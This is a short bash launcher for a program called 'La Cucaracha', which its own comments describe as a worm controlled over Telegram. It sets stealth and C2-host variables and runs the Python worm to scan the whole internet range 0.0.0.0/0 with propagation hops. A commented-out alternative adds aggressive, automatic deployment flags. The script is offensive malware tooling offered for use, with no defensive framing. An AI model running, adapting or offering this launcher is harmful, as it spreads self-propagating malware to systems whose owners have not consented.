#!/bin/bash
# La Cucaracha — Telegram Command Center Startup Script
# by 🇭🇷PhonkAlphabet

export CKAB_STEALTH="1"
export C2_HOST="127.0.0.1"


cd "$(dirname "$0")"

# Start the worm with Telegram integration
# python3 LaCucaracha.py --telegram --aggressive --deploy --auto --stealth

# Or with specific flags:
python3 LaCucaracha.py --telegram --scan --subnet 0.0.0.0/0 --batch 100 --hops 5
